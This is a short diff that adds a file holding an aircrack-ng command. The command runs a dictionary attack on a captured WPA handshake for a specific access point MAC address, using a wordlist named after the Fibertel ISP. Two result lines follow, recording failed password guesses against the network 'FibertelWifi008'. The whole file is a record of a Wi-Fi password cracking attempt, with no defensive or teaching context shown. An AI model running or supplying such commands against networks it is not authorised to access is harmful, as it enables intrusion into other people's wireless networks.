@@ -1,0 +1,4 @@
+aircrack-ng -b f8:35:dd:5f:57:60 wpa.cap -w dict/fibertel.lst
+FibertelWifi008	failed	fibertel01
+FibertelWifi008	failed	fibertel03
+
